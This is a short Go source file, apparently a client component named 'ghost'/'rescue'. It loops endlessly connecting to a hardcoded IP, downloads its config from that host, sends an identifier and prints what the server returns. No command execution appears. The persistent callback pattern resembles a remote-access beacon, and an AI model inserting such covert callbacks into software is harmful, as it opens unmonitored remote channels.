package main

import (
	"fmt"
	"net"
)

func initRescue() {
	//获取server地址
	if !Exists("rescueip") {
		WriteFile("rescueip", "39.100.5.139")
	}
	ip, _ := ReadFile("rescueip")
	//连接
mkConn:
	for {
		fmt.Println("try to connect:" + ip)
		conn, err := net.Dial("tcp", ip+":1032")
		if err != nil {
			continue mkConn
		}
		fmt.Println("rescue connected")
		handleConn(conn)
	}
	wg.Done()
}

func handleConn(conn net.Conn) {
	//读取name
	if !Exists("ghostjc.ini") {
		err := DownloadFile("http://39.100.5.139/ghost/client/ghostjc.ini", "ghostjc.ini")
		if err != nil {
			WriteFile("ghostjc.ini", "port=1033\nip=39.100.5.139\nname=test\n")
		}
	}
	var cfg config
	err := cfg.Load("ghostjc.ini")
	if err != nil {
		fmt.Println("无法读取配置文件", err.Error())
	}
	//writer:=bufio.NewWriter(conn)
	//发送name数据
	name, _ := cfg.Get("name")
	fmt.Println("name:" + name)
	conn.Write([]byte("info n" + name))
	fmt.Println("name sent")
	msg := make([]byte, 256)
	for {
		count, err := conn.Read(msg)
		if err != nil {
			return
		}
		fmt.Println(count, msg)
	}
}
